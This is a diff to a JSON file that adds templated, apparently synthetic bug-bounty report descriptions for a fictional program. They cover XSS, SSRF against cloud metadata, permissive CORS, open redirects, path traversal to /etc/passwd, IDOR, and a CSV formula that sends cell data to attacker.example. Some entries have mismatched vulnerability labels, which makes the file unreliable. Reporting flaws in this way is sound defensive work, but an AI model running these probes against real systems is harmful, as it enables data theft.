+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12261,7 +12353,8 @@
           "offset": "9d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12417,7 +12510,8 @@
           "offset": "4d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12545,7 +12639,8 @@
           "offset": "5d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12705,7 +12800,8 @@
           "offset": "1d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12852,7 +12948,8 @@
           "offset": "4d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13020,7 +13117,8 @@
           "offset": "5d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13148,7 +13246,8 @@
           "offset": "4d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13284,7 +13383,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13403,7 +13503,8 @@
           "offset": "1d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.aareguard-cyber.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13505,7 +13606,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13637,7 +13739,8 @@
           "offset": "5d 16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13733,7 +13836,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13865,7 +13969,8 @@
           "offset": "1d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14017,7 +14122,8 @@
           "offset": "6d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14153,7 +14259,8 @@
           "offset": "1d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14293,7 +14400,8 @@
           "offset": "7d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14448,7 +14556,8 @@
           "offset": "7d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14596,7 +14705,8 @@
           "offset": "5d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14736,7 +14846,8 @@
           "offset": "7d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14860,7 +14971,8 @@
           "offset": "4d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15008,7 +15120,8 @@
           "offset": "4d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.aareguard-cyber.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15163,7 +15276,8 @@
           "offset": "4d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15281,7 +15395,8 @@
           "offset": "2d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15383,7 +15498,8 @@
           "offset": "2d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15478,7 +15594,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15638,7 +15755,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15774,7 +15892,8 @@
           "offset": "7d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15890,7 +16009,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.aareguard-cyber.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16029,7 +16149,8 @@
           "offset": "5d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16201,7 +16322,8 @@
           "offset": "6d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16292,7 +16414,8 @@
           "offset": "2d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
